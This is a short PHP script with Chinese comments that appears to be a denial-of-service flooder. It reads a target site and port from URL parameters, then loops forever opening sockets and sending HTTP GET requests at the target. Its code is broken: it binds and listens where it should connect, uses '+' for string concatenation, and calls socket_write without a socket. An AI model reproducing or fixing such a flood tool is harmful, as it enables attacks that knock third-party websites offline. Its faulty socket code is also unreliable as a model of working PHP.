<?php
error_reporting(E_ALL);  //提示错误信息
set_time_limit(0);     //设定一个程式所允许执行的秒数   0 是无限循环
ob_implicit_flush();     // 刷新输出缓冲
$address = $_GET['site'];  // 网站地址
$port = $_GET['port'];      // 端口
$sayi = 1;

while ( true )   
{
	if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
		echo "HaHa\n";
	}

	if (socket_bind($sock, $address, $port) === false) {       // 连接端口
		echo "HaHa\n";
	}

	if (socket_listen($sock, 5) === false) {
		echo "HaHa\n";
	}
		$msg = "HTTP/1.1 GET /\r\nHost:"+$_GET['site']+"\r\nConnection: Keep-Alive\r\n";
		socket_write($msg);
		socket_close($sock);
		$sayi++;   // 循环一次 变量sayi 加1
		echo "Goodbye...".$sayi;   // 输出循环次数
}
?>